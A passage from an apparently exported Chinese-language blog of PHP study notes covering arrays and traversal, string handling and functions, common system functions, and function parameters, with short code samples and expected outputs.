    var_dump($arr3);  //输出为 array(5) { [0]=&gt; int(1) [10]=&gt; int(100) [11]=&gt; string(1) &quot;1&quot; [&quot;key&quot;]=&gt; string(3) &quot;key&quot; [1]=&gt; string(5) &quot;value&quot; } 
    echo &quot;&lt;/br&gt;&quot;;

?&gt;</code></pre><h4 id="3-数组特点"><a href="#3-数组特点" class="headerlink" title="3. 数组特点"></a>3. 数组特点</h4><ul>
<li>可以整数下标或者字符串下标<ul>
<li>如果数组下标都为整数：索引数组</li>
<li>如果数组下标都为字符串：关联数组</li>
</ul>
</li>
<li>不同下标可以混合存在：混合数组</li>
<li>数组元素的顺序以放入顺序为准，跟下标无关</li>
<li>数字下标的自增长特性：从0开始自动增长，如果中间手动出现较大的，那么后面的自增长元素从最大的值+1开始</li>
<li>特殊值下标的自动转换<ul>
<li>布尔值：true和false</li>
<li>空：NULL</li>
</ul>
</li>
<li>PHP中数组元素没有类型限制</li>
<li>PHP中数组元素没有长度限制</li>
<li>▲ PHP中的数组是很大的数据，所以存储位置是堆区，为当前数组分配一块连续的内存</li>
</ul>
<pre><code>&lt;?php

    //索引数组
    $arr = array(0 =&gt; &#39;心东&#39;,1 =&gt; &#39;21&#39;,2 =&gt; &#39;网络安全&#39;,3 =&gt; &#39;睡觉吃饭&#39;);

    $arr[4] = &#39;php开发&#39;;

    echo $arr[4];  //输出为php开发
    echo &quot;&lt;/br&gt;&quot;;
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

    //关联数组
    $arr1 = array(&#39;mingzi&#39; =&gt; &#39;心东&#39;,&#39;nianling&#39; =&gt; &#39;21&#39;,&#39;zhiye&#39; =&gt; &#39;网络安全&#39;,&#39;aihao&#39; =&gt; &#39;吃饭睡觉&#39;);

    //增加
    $arr1[&#39;demo&#39;] = &#39;123456&#39;;
    echo $arr1[&#39;demo&#39;];  //输出为123456
    echo &quot;&lt;/br&gt;&quot;;
    //修改
    $arr1[&#39;mingzi&#39;] = &#39;mzt&#39;;
    echo $arr1[&#39;mingzi&#39;];  //输出为mzt
    echo &quot;&lt;/br&gt;&quot;;
    print_r($arr1);
    echo &quot;&lt;/br&gt;&quot;;

    //混合数组
    $arr2 = array(1 =&gt; &#39;心东&#39;,&#39;nianling&#39; =&gt; &#39;21&#39;,2 =&gt; &#39;网络安全&#39;,&#39;aihao&#39; =&gt; &#39;吃饭睡觉&#39;);

    echo $arr2[1];  //输出为心东
    echo &quot;&lt;/br&gt;&quot;;
    echo $arr2[&#39;nianling&#39;];  //输出为21
    echo &quot;&lt;/br&gt;&quot;;
    print_r($arr2);


    //隐形数组：
    $arr3[] = 1;
    $arr3[10] = 100;
    $arr3[] = &#39;1&#39;;
    $arr3[&#39;key&#39;] = &#39;key&#39;;
    $arr3[1] = &#39;value&#39;;
    var_dump($arr3);  //输出为 array(5) { [0]=&gt; int(1) [10]=&gt; int(100) [11]=&gt; string(1) &quot;1&quot; [&quot;key&quot;]=&gt; string(3) &quot;key&quot; [1]=&gt; string(5) &quot;value&quot; } 
    echo &quot;&lt;/br&gt;&quot;;


    //特殊下标转换
    $arr4[false] = false;
    $arr4[true] = true;
    $arr4[NULL] = NULL;
    var_dump($arr4);  //输出为 array(3) { [0]=&gt; bool(false) [1]=&gt; bool(true) [&quot;&quot;]=&gt; NULL } 


?&gt;</code></pre><h4 id="4-多维数组"><a href="#4-多维数组" class="headerlink" title="4. 多维数组"></a>4. 多维数组</h4><ul>
<li>二维数组：数组中所有的元素都是一维数组</li>
</ul>
<pre><code>&lt;?php

    //多维数组

    //定义二维数组
    $info = array(
        array(&#39;name&#39; =&gt; &#39;Jim&#39;,&#39;age&#39; =&gt; 30),
        array(&#39;name&#39; =&gt; &#39;Tom&#39;,&#39;age&#39; =&gt; 28),
        array(&#39;name&#39; =&gt; &#39;Lily&#39;,&#39;age&#39; =&gt; 20)             
        //最后一个元素，后面可以跟逗号不影响
    );

    echo &#39;&lt;pre&gt;&#39;;
    print_r($info);

?&gt;</code></pre><ul>
<li>多维数组<ul>
<li>在第二维的数组元素中可以继续是数组，在PHP中没有维度限制</li>
<li>▲ PHP本质并没有二维数组</li>
<li>▲ 不建议使用超过三维以上的数组，会增加访问的复杂度，降低访问效率</li>
</ul>
</li>
<li>异形数组（不规则数组）<ul>
<li>数组中的元素不规则，有普通基本变量也有数组</li>
</ul>
</li>
</ul>
<h4 id="5-数组遍历"><a href="#5-数组遍历" class="headerlink" title="5. 数组遍历"></a>5. 数组遍历</h4><ul>
<li>普通数组数据的访问都是通过数组元素的下标来实现访问，如果说数组中所有的数据都需要依次输出出来，就需要我们使用到一些简化的规则来实现自动获取下标以及输出数组元素<ul>
<li>访问一维元素：$arr[一维下标]</li>
<li>访问二维元素：$arr[一维下标][二维下标]</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //索引数组循环
    $arr = array(0 =&gt; &#39;心东&#39;,1 =&gt; &#39;21&#39;,2 =&gt; &#39;网络安全&#39;,3 =&gt; &#39;睡觉吃饭&#39;);

    for($i=0;$i&lt;count($arr);$i++)
    {
        echo $arr[$i];  //输出索引数组
    }
    echo &quot;&lt;/br&gt;&quot;;   


    //关联数组循环
    $arr1 = array(&#39;mingzi&#39; =&gt; &#39;心东&#39;,&#39;nianling&#39; =&gt; &#39;21&#39;,&#39;zhiye&#39; =&gt; &#39;网络安全&#39;,&#39;aihao&#39; =&gt; &#39;吃饭睡觉&#39;);

    foreach($arr1 as $key =&gt; $value)
    {
        echo &#39;键名:&#39;.$key.&#39;值&#39;.$value.&#39;&lt;/br&gt;&#39;;
        echo $arr1[$key].&quot;&lt;/br&gt;&quot;;  //输出关联数组
    }

    //索引数组和关联数组都可以通过这样的方式去遍历
    foreach($arr as $value)
    {

        echo $value.&quot;&lt;/br&gt;&quot;;  //输出值
    }

?&gt;</code></pre><h4 id="6-Foreach遍历"><a href="#6-Foreach遍历" class="headerlink" title="6. Foreach遍历"></a>6. Foreach遍历</h4><ul>
<li>原理：本质是数组的内部有一颗指针，默认是指向数组元素的第一个元素，foreach就是利用指针去获取数据，同时移动指针</li>
<li>遍历过程<ul>
<li>foreach会重置指针：让指针指向第一个元素</li>
<li>进入foreach循环：通过指针取得当前第一个元素，然后将下标取出放到对应的下标变量$key中（如果存在），将值取出来放到对应的值变量$value中（指针下移）</li>
<li>进入到循环内部（循环体），开始执行</li>
<li>重复2和3，直到在2的时候遇到指针取不到内容（指针指向数组最后）</li>
</ul>
</li>
<li>▲▲ 如果是关联数组（字母下标），就需要下标，如果是数字下标就直接访问值</li>
<li>▲▲ 在进行数据存储定义的时候，通常二维数组不会两个维度的key下标都为数字，一般是一维为数字（无意义），二维为字符串（数据库表字段），所以在进行遍历的时候，通常是只需要针对一维进行遍历，取得二维数组元素，然后二维数组元素通过下标去访问</li>
</ul>
<pre><code>&lt;?php

    //PHP数组遍历：foreach


    //定义一维数组
    $arr = array(1,2,3,4,5,6,7,8,9,10);

    //foreach循环一维数组
    foreach($arr as $v){
        //$v随意命名
        echo $v,&#39;&lt;br/&gt;&#39;;
    }

    //foreach循环一维数组
    foreach($arr as $k =&gt; $v){
        //$v随意命名
        echo &#39;key:&#39;,$k,&#39; == value:&#39;,$v,&#39;&lt;br/&gt;&#39;;
    }

    //通过foreach遍历二维元素 -&gt; 常规形式

    $arr1 = array(
        0 =&gt; array(&#39;name&#39; =&gt; &#39;Tom&#39;,&#39;age&#39; =&gt; 30),
        1 =&gt; array(&#39;name&#39; =&gt; &#39;Jim&#39;,&#39;age&#39; =&gt; 28)
    );

    foreach($arr1 as $value){
        //1、可以继续遍历：增加foreach遍历$value
        //2、可以使用下标访问
        echo &#39;name is : &#39; ,$value[&#39;name&#39;],&#39; and age is : &#39;,$value[&#39;age&#39;],&#39;&lt;br/&gt;&#39;;
    }

    //通过foreach遍历二维元素 -&gt; 非常规形式

    $arr = array(&#39;123&#39;,&#39;456&#39;,array(&#39;ttt&#39;,4444));
    foreach($arr as $key =&gt; $value)
    {
        if(is_array($value))
        {
            foreach($value as $k1 =&gt; $v1)
            {
                echo &quot;二维数组&quot;.$v1.&quot;&lt;/br&gt;&quot;;
            }
        }else
        {
            echo $value.&quot;&lt;/br&gt;&quot;;
        }
    }

?&gt;</code></pre><h4 id="7-For循环遍历数组"><a href="#7-For循环遍历数组" class="headerlink" title="7. For循环遍历数组"></a>7. For循环遍历数组</h4><ul>
<li>基于已知边界条件（起始和结束）然后有条件的变化（规律）</li>
<li>条件<ul>
<li>获取数组长度：count(数组)得到数组元素的长度</li>
<li>要求数组元素的下标是规律的数字</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //for循环遍历数组

    //数组特点：索引数组，下标规律

    $arr = array(1,2,3,4,5,6,7,10);

    for($i = 0,$len = count($arr); $i &lt; $len; $i++){
        echo &#39;key is : &#39;,$i,&#39; and value is : &#39; , $arr[$i],&#39;&lt;br/&gt;&#39;;
    }

?&gt;</code></pre><h4 id="8-While配合each和list遍历数组"><a href="#8-While配合each和list遍历数组" class="headerlink" title="8. While配合each和list遍历数组"></a>8. While配合each和list遍历数组</h4><ul>
<li>each函数的使用：each能够从一个数组中获取当前数组指针所指向的元素的下标和值，拿到之后将数组指针下移，同时将拿到的元素下标和值以一个四个元素的数组返回<ul>
<li>0下标 -&gt; 取得元素的下标值</li>
<li>1下标 -&gt; 取得元素的值</li>
<li>Key下标 -&gt; 取得元素的下标值</li>
<li>Value下标 -&gt; 取得元素的值</li>
</ul>
</li>
<li>▲ 如果each取不到结果（数组指针移动到最后），返回false</li>
</ul>
<pre><code>&lt;?php

    //while配合each和list遍历数组

    $arr = array(1,&#39;name&#39; =&gt; &#39;Tom&#39;,3,&#39;age&#39; =&gt; 30);

    echo &#39;&lt;pre&gt;&#39;;
    //each函数指针操作
    print_r(each($arr));
    print_r(each($arr));
    print_r(each($arr));
    print_r(each($arr));
    var_dump(each($arr));

?&gt;</code></pre><ul>
<li>List函数使用：list是一种结构，不是一种函数（没有返回值），是list提供一堆变量去从一个数组中取得元素值，然后依次存放到对应的变量当中</li>
<li>▲ list必须从索引数组中去获取数据，而且必须从0开始</li>
</ul>
<pre><code>&lt;?php

    //list结构
    $arr = array(1,2 =&gt; 1);

    list($first) = $arr;
    var_dump($first);  //输出为int(1)
    echo &quot;&lt;/br&gt;&quot;;

    list($first,$second) = $arr;      //错误：second变量对应的下标为元素下标1的，但是数组没有
    var_dump($first,$second); 

?&gt;</code></pre><ul>
<li>list和each配合<ul>
<li>each一定有两个元素就是0和1下标元素</li>
<li>▲ List(变量1,变量2) = each(数组);  //是一种赋值运算，但是可以得到false结果（each取不到正确的结果），整个表达式为false</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //while循环
    $arr = array(1,&#39;name&#39; =&gt; &#39;Tom&#39;,3,&#39;age&#39; =&gt; 30);

    while(list($key,$value) = each($arr)){
        //list搭配each
        //list($key,$value) = each($arr);

        //输出
        echo &#39;key is :&#39; . $key . &#39; value is :&#39; . $value . &#39;&lt;br/&gt;&#39;;
    }

?&gt;</code></pre><h4 id="9-数组的比较"><a href="#9-数组的比较" class="headerlink" title="9. 数组的比较"></a>9. 数组的比较</h4><ul>
<li>数组的比较主要是比较数组的长度，数组元素的值</li>
<li>==和===<ul>
<li>==：要求数组长度一致，数组元素的值相等，下标也要相等</li>
<li>===：数组长度一致，值和类型完全一致，出现的顺序也必须相同</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //数组比较

    $arr1 = array(1,2,3);
    $arr2 = array(3,2,1);
    $arr3 = array(2 =&gt; 3,1 =&gt; 2,0 =&gt; 1);

    //==比较
    var_dump($arr1==$arr2);  //输出为bool(false)
    var_dump($arr1==$arr3);  //输出为bool(true)

    //===比较
    var_dump($arr1===$arr3);  //输出为bool(false) 

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-13：字符串</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-13%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<hr>
<h4 id="1-字符串表示"><a href="#1-字符串表示" class="headerlink" title="1. 字符串表示"></a>1. 字符串表示</h4><ul>
<li>引号方式：比较适合定义那些比较短（不超过一行）或者没有结构要求的字符串<ul>
<li>单引号字符串：使用单引号包裹</li>
<li>双引号字符串：使用双引号包裹</li>
</ul>
</li>
<li>如果有结构要求，或者内容超过一行，可以使用以下两种结构定义<ul>
<li>nowdoc字符串：没有单引号的单引号字符串</li>
<li>heredoc字符串：没哟双引号的双引号字符串</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //字符串
    $i = &#39;123&#39;;

    $demo = &quot;&lt;p&gt;000&lt;/p&gt; &lt;p&gt;$i&lt;/p&gt;&quot;;
    echo $demo; //输出 000 123
    $demo = &#39;&lt;p&gt;000&lt;/p&gt; &lt;p&gt;$i&lt;/p&gt;&#39;;
    echo $demo; //输出 000 $i
    echo &quot;&lt;/br&gt;&quot;;

    //PHP字符串：定义
    header(&#39;Content-type:text/html;charset=utf-8&#39;);

    //引号定义
    $str1 = &#39;hello&#39;;
    $str2 = &quot;hello&quot;;
    var_dump($str1,$str2);
    echo &quot;&lt;/br&gt;&quot;;


    //结构化定义
    //heredoc结构
    $str3 = &lt;&lt;&lt;EOD
        hello
            world
EOD;

    //nowdoc结构
    $str4 = &lt;&lt;&lt;&#39;EOD&#39;
        hello
            world
EOD;

    var_dump($str3,$str4);


?&gt;</code></pre><h4 id="2-字符串转义"><a href="#2-字符串转义" class="headerlink" title="2. 字符串转义"></a>2. 字符串转义</h4><ul>
<li>在计算机通用协议中，有一些特定的方式定义的字母，系统会特定处理，通常这种方式都是使用反斜杠+字母（单词）的特性，如\r\n：回车换行</li>
<li>转义符号<ul>
<li>&#39;：在单引号字符串中显示单引号</li>
<li>&quot;：在双引号字符串中显示双引号</li>
<li>\r：代表回车</li>
<li>\n：代表新一行</li>
<li>\t：类似tab键，输出4个空格</li>
<li>$：在PHP中使用$符号作为变量符号，因此需要特定识别</li>
</ul>
</li>
<li>单引号和双引号的区别<ul>
<li>其中单引号中能够识别&#39;，而双引号中就不能识别&#39;</li>
<li>双引号中因为能够识别$符号，所以双引号中可以解析变量，而单引号不可以</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //定义字符串识别转义符号
    $str1 = &#39;abc\r\ndef\t\&#39;\&quot;\$fg&#39;;
    $str2 = &quot;abc\r\ndef\t\&#39;\&quot;\$fg&quot;;

    echo $str1,&#39;&lt;br/&gt;&#39;,$str2;

?&gt;</code></pre><ul>
<li>双引号中变量识别的规则<ul>
<li>变量本身系统能够与后面的内容区分：应该保证变量的独立性，不要让系统难以区分</li>
<li>使用变量专业标识符（区分），给变量加上一组大括号{}</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    $a = &#39;hello&#39;;
    //变量识别
    $str1 = &#39;abce $a dfg&#39;;
    $str2 = &quot;abce $a dfg&quot;;  
    $str3 = &quot;abce$adfg&quot;;    
    $str4 = &quot;abce{$a}dfg&quot;;  
    echo $str1,&#39;&lt;br/&gt;&#39;,$str2,&#39;&lt;br/&gt;&#39;,$str3,&#39;&lt;br/&gt;&#39;,$str4;

?&gt;</code></pre><ul>
<li>结构化定义字符串变量的规则<ul>
<li>上边界符后面不能跟任何内容</li>
<li>下边界符必须顶格：最左边</li>
<li>下边界同样后面只能跟分号，不能跟任何内容</li>
<li>结构化定义字符串的内部（边界符之间）的所有内容都是字符串本身</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    $str1 = &lt;&lt;&lt;EOD
    //这是弹出内容
        &lt;script&gt;
            alert(&#39;xss&#39;); //js弹出字符串必须要有引号
        &lt;/script&gt;
EOD;

    echo $str1;  //发送弹框

?&gt;</code></pre><h4 id="3-字符串长度问题"><a href="#3-字符串长度问题" class="headerlink" title="3. 字符串长度问题"></a>3. 字符串长度问题</h4><ul>
<li><a href="http://www.w3school.com.cn/php/php_ref_string.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/php_ref_string.asp</a></li>
<li>strlen()：得到字符串的长度（字节为单位）</li>
<li>多字节字符串的长度问题：包含中文的长度<ul>
<li>多字节字符串扩展模块：mbstring扩展 -&gt; php.ini -&gt; extension=mbstring</li>
</ul>
</li>
<li>区别：strlen只是针对标准交换码ASCII，mtstring会针对不同的字符集</li>
</ul>
<pre><code>&lt;?php

     //字符串长度
    header(&#39;Content-type:text/html;charset=utf-8&#39;);

    //定义字符串
    $str1 = &#39;abcefjdoifaoi&#39;;
    $str2 = &#39;你好中国123&#39;;

    echo strlen($str1),&#39;&lt;br/&gt;&#39;,strlen($str2);  //输出为 13 15

    echo &#39;&lt;hr/&gt;&#39;;
    //使用mbstring扩展
    echo mb_strlen($str1),&#39;&lt;br/&gt;&#39;,mb_strlen($str2),&#39;&lt;br/&gt;&#39;,mb_strlen($str2,&#39;utf-8&#39;);  //输出为 13 7 7

?&gt;</code></pre><h4 id="4-字符串相关函数"><a href="#4-字符串相关函数" class="headerlink" title="4. 字符串相关函数"></a>4. 字符串相关函数</h4><ul>
<li>转换函数<ul>
<li>implode(连接方式,数组)：将数组中的元素按照某个规则连接成一个字符串</li>
<li>explode(分割字符,目标字符串)：将字符串按照某个格式进行分割，变成数组</li>
<li>str_split(字符串,字符长度)：按照指定长度拆分字符串得到数组</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    $arr1 = array(&#39;aliyun&#39;,&#39;wuyidaxue&#39;,&#39;top&#39; );

    $arr2 = implode(&#39;.&#39;, $arr1);  //输出为 aliyun.wuyidaxue.top
    echo $arr2.&quot;&lt;/br&gt;&quot;;


    $arr3 = explode(&#39;.&#39;, $arr2);
    var_dump($arr3);  //输出为 array(3) { [0]=&gt; string(6) &quot;aliyun&quot; [1]=&gt; string(9) &quot;wuyidaxue&quot; [2]=&gt; string(3) &quot;top&quot; } 
    echo &quot;&lt;/br&gt;&quot;;

    $arr4 = str_split($arr2,7);
    var_dump($arr4);  //输出为 array(3) { [0]=&gt; string(7) &quot;aliyun.&quot; [1]=&gt; string(7) &quot;wuyidax&quot; [2]=&gt; string(6) &quot;ue.top&quot; } 
    echo &quot;&lt;/br&gt;&quot;;


?&gt;</code></pre><ul>
<li>截取函数<ul>
<li>trim(字符串[,指定字符])：本身默认是用来去除字符串两边的空格（中间不行），但是也可以指定要去除的内容，是按照指定的内容循环去除两边有的内容：直到碰到一个不是目标字符为止</li>
<li>ltrim()：去除左边的</li>
<li>rtrim()：去除右边的</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //截取函数

    $str = &#39; abcd e f &#39;;

    var_dump(trim($str));  //输出为 string(8) &quot;abcd e f&quot; 
    echo &quot;&lt;br/&gt;&quot;;
    var_dump(ltrim($str));  //输出为 string(9) &quot;abcd e f &quot; 
    echo &quot;&lt;br/&gt;&quot;;
    var_dump(rtrim($str));  //输出为 string(9) &quot; abcd e f&quot; 

?&gt;</code></pre><ul>
<li>截取函数<ul>
<li>substr(字符串,起始位置从0开始[,长度])：指定位置开始截取字符串，可以截取指定长度（不指定到最后）</li>
<li>strstr(字符串,匹配字符)：从指定位置开始，截取到最后（可以用来去文件后缀名）</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //截取函数

    $str = &#39; abcd e f &#39;;

    //字符串截取
    echo substr($str,1,3),&#39;&lt;br/&gt;&#39;;  //输出为 abc
    echo strstr($str,&#39;c&#39;);  //输出为 cd e f 

?&gt;</code></pre><ul>
<li>大小转换函数<ul>
<li>strtolower：全部小写</li>
<li>strtoupper：全部大写</li>
<li>ucfirst：首字母大写</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //大小写转换函数

    $str = &#39;abcd e f &#39;;

    //字符串大小写
    echo strtoupper($str),&#39;&lt;br/&gt;&#39;;  //输出为 ABCD E F 
    echo ucfirst($str);  //输出为 Abcd e f 

?&gt;</code></pre><ul>
<li>查找函数<ul>
<li>strpos(字符串，匹配字符)：判断字符在目标字符串中出现的位置（首次）</li>
<li>strrpos(字符串，匹配字符)：判断字符在目标字符串中最后出现的位置</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //查找函数

    $str = &#39;123a234a3b2a&#39;;

    //查找位置
    echo strpos($str,&#39;a&#39;),&#39;&lt;br/&gt;&#39;;  //输出为 3
    echo strrpos($str,&#39;a&#39;);  //输出为 11

?&gt;</code></pre><ul>
<li>替换函数<ul>
<li>str_replace(匹配目标,替换的内容,字符串本身)：将目标字符串中部分字符串进行替换</li>
</ul>
</li>
<li>格式函数<ul>
<li>printf/sprintf(输出字符串有占位符,顺序占位内容..)：格式化输出数据</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    $age = 50;
    $name = &#39;TOM&#39;;
    $str = &#39;123a234a3b2a&#39;;

    //格式化输出
    echo sprintf(&quot;你好，今年我%d岁,我叫%s&quot;,$age,$name);  //输出为 你好，今年我50岁,我叫TOM  //同C语言的格式
    echo &quot;&lt;/br&gt;&quot;;

    //字符串替换
    echo str_replace(&#39;a&#39;,&#39;b&#39;,$str);  //输出为 123b234b3b2b

?&gt;</code></pre><ul>
<li>其他<ul>
<li>str_repeat()：重复某个字符串N次</li>
<li>str_shuffle()：随机打乱字符串</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //其他字符串函数
    $str = &#39;abcdefg&#39;;

    echo str_repeat($str,5),&#39;&lt;br/&gt;&#39;;  //输出为 abcdefgabcdefgabcdefgabcdefgabcdefg
    echo str_shuffle($str);  //输出为 decgbaf

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-12：常用系统函数</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-12%EF%BC%9A%E5%B8%B8%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<hr>
<h4 id="1-有关输出的函数"><a href="#1-有关输出的函数" class="headerlink" title="1. 有关输出的函数"></a>1. 有关输出的函数</h4><ul>
<li>print()：类似于echo输出提供的内容，本质是一种结构（不是函数），返回1，可以不需要使用括号</li>
<li>print_r()：类似于var_dump，但是比var_dump简单，不会输出数据的类型，只会输出值（数组打印使用比较多）</li>
</ul>
<pre><code>&lt;?php

    //系统函数

    //输出相关
    echo print(&#39;hello world&lt;br/&gt;&#39;);
    print &#39;hello world&lt;br/&gt;&#39;;

    $a = &#39;hello world&lt;br/&gt;&#39;;
    print_r($a);

    echo &#39;&lt;hr/&gt;&#39;;

?&gt;</code></pre><h4 id="2-有关时间的函数"><a href="#2-有关时间的函数" class="headerlink" title="2. 有关时间的函数"></a>2. 有关时间的函数</h4><ul>
<li>时间戳是自 1970 年 1 月 1 日（00:00:00 GMT）以来的秒数。它也被称为 Unix 时间戳（Unix Timestamp）</li>
<li>时间戳转日期<ul>
<li>Y：年（四位数）大写 </li>
<li>m：月（两位数，首位不足补0）小写 </li>
<li>d：日（两位数，首位不足补0）小写 </li>
<li>H：小时 带有首位零的 24 小时小时格式 </li>
<li>h：小时 带有首位零的 12 小时小时格式 </li>
<li>i：带有首位零的分钟 </li>
<li>s：带有首位零的秒（00 -59） </li>
<li>a：小写的午前和午后（am 或 pm）</li>
</ul>
</li>
<li>var_dump(date(‘Y-m-d H:i:s’, 1502204401));</li>
<li>date()：按照指定格式对对应的时间戳（从1970年格林威治时间开始计算的秒数），如果没有指定特定的时间戳，那么就是默认解释当前时间戳</li>
<li>time()：获取当前时间对应的时间戳</li>
<li>microtime()：获取微秒级别的时间</li>
<li>Strtotime()：按照规定格式的字符串转换成时间戳</li>
</ul>
<pre><code>&lt;?php

    //时间函数
    echo date(&#39;Y 年 m 月 d 日 H:i:s&#39;,12345678),&#39;&lt;br/&gt;&#39;;
    echo time(),&#39;&lt;br/&gt;&#39;;
    echo microtime(),&#39;&lt;br/&gt;&#39;;

    echo strtotime(&#39;tomorrow 10 hours&#39;);

    echo &#39;&lt;hr/&gt;&lt;pre&gt;&#39;;

?&gt;</code></pre><h4 id="3-有关数学的函数"><a href="#3-有关数学的函数" class="headerlink" title="3. 有关数学的函数"></a>3. 有关数学的函数</h4><ul>
<li>max()：指定参数中最大的值</li>
<li>min()：比较两个数中较小的值</li>
<li>rand()：得到一个随机数，指定区间的随机整数</li>
<li>mt_rand()：与rand一样，只是底层结构不一样，效率比rand高</li>
<li>round()：四舍五入</li>
<li>ceil()：向上取整</li>
<li>floor()：向下取整</li>
<li>pow()：求指定数字的指定指数次结果：pow(2,8) == 2^8 == 256</li>
<li>abs()：绝对值</li>
<li>sqrt()：求平方根</li>
</ul>
<h4 id="4-有关函数的函数"><a href="#4-有关函数的函数" class="headerlink" title="4. 有关函数的函数"></a>4. 有关函数的函数</h4><ul>
<li>function_exists()：判断指定的函数名字是否在内存中存在（帮助用户不去使用一个不存在的函数，让代码安全性更高）</li>
<li>func_get_arg()：在自定义函数中去获取指定数值对应的参数</li>
<li>func_get_args()：在自定义函数中获取所有的参数（数组）</li>
<li>func_num_args()：获取当前自定义函数的参数数量</li>
</ul>
<pre><code>&lt;?php

    //函数相关函数
    function test($a,$b){
        //获取指定参数
        var_dump(func_get_arg(1));

        //获取所有参数
        var_dump(func_get_args());

        //获取参数数量
        var_dump(func_num_args());
    }

    //调用函数
    function_exists(&#39;test&#39;) &amp;&amp; test(1,&#39;2&#39;,3,4);

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-11：函数</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-11%EF%BC%9A%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<hr>
<h4 id="1-函数的基本概念"><a href="#1-函数的基本概念" class="headerlink" title="1. 函数的基本概念"></a>1. 函数的基本概念</h4><ul>
<li>function，是一种语法结构，将实现某一个功能的代码块（多行代码）封装到一个结构中，从而实现代码的重复利用（复用）</li>
</ul>
<h4 id="2-函数的使用"><a href="#2-函数的使用" class="headerlink" title="2. 函数的使用"></a>2. 函数的使用</h4><ul>
<li>定义函数的目的：是为了实现代码的重复利用，一个功能一个函数（简单明了）</li>
<li>函数的使用：通过访问函数的名字+()；<ul>
<li>如果函数在定义的过程中有参数，那么在调用的时候就必须传入对应的参数：函数是一种结构不会自动运行，必须通过调用才会执行</li>
</ul>
</li>
<li>函数是在代码执行阶段，碰到函数名字的时候才会调用，不是在编译阶段</li>
<li>函数执行的内存分析<ul>
<li>读取代码进入到代码段（编译：将代码变成字节码存储到内存）</li>
<li>根据代码逐行执行</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //函数


    //调用函数
    display();
    echo &quot;&lt;/br&gt;&quot;;


    //定义函数
    function display(){
        //函数体
        echo &#39;hello world&#39;;     //存在返回值，输出为&#39;hello world&#39;
    }


    //调用函数
    display();  //存在返回值，输出为&#39;hello world&#39;

?&gt;</code></pre><h4 id="3-函数命名规范"><a href="#3-函数命名规范" class="headerlink" title="3. 函数命名规范"></a>3. 函数命名规范</h4><ul>
<li>命名规范：由字母、数字和下划线组成，但是不能以数字开头<ul>
<li>驼峰法：除了左边第一个单词外，后面所有的单词首字母都大写：showParentInfo()</li>
<li>下划线法：单词之间通过下划线连接，单词都是小写：show_parent_info()</li>
</ul>
</li>
<li>▲ 函数作为一种常用的结构，一般遵循以下规则：函数通常名字代表着函数的功能，而有些功能会比较复杂，可能一个单词不足以表达，需要多个组合</li>
<li>▲ 函数名字：在一个脚本周期中，不允许出现同名函数</li>
</ul>
<h4 id="4-参数详解"><a href="#4-参数详解" class="headerlink" title="4. 参数详解"></a>4. 参数详解</h4><ul>
<li>形参：形式参数，不具有实际意义的参数，是在函数定义时使用的参数</li>
<li>实参：实际参数，具有实际数据意义的参数，是在函数调用时使用的参数</li>
<li>▲ 形参是实参的载体：实参在调用时通常是需要传入到函数内部参与计算（运算），那么需要在函数内部去找到实际数据所在的位置才能找到数据本身：需要实际调用的时候，将数据以实参的形式传递给形参：给形参赋值，从而使得函数内部可以用到外部数据</li>
<li>▲ 注意<ul>
<li>在PHP中允许实参多余形参（个数）：函数内部不用而已</li>
<li>在PHP中理论上形参个数没有限制（实际开发不会太多）</li>
<li>实参不能少于形参个数</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //定义函数
    function add($arg1,$arg2){      //形参可以有多个，使用逗号分隔即可
        //函数体：可以直接使用形参运算
        echo $arg1 + $arg2;
    }

    //调用函数
    $num1 = 10;

    add($num1,20);   //传入的实参，可以是变量或者其他有值的表达式，输出为 30
?&gt;</code></pre><ul>
<li>默认值：default value，指的是形参的默认值，在函数定义的时候，就给形参进行一个初始赋值，如果实际调用传入的参数（实参）没有提供，那么形参就会使用定义时的值来进入函数内部参与运算</li>
</ul>
<pre><code>&lt;?php

    //调用函数
    $num1 = 10;

    //函数的默认值
    function jian($num1 = 0,$num2 = 0){   
        //当前的$num1是形参，在编译时不执行，即便执行也是在jian函数内部，不会与外部的$num1变量冲突
        echo $num1 - $num2;
    }

    //调用：默认值如果存在，可以不用传入
    jian($num1);
    echo &quot;&lt;/br&gt;&quot;;
    echo $num1;

?&gt;</code></pre><ul>
<li>引用传递<ul>
<li>实参在调用时会将值赋值给形参，那么实际上使用的方式就是一种简单的值传递：将实参（如果是变量或者常量或者其他表达式）的结果（值）取出来赋值给形参：形参与外部实际传入的参数本身没有任何关联关系：只是结果一样</li>
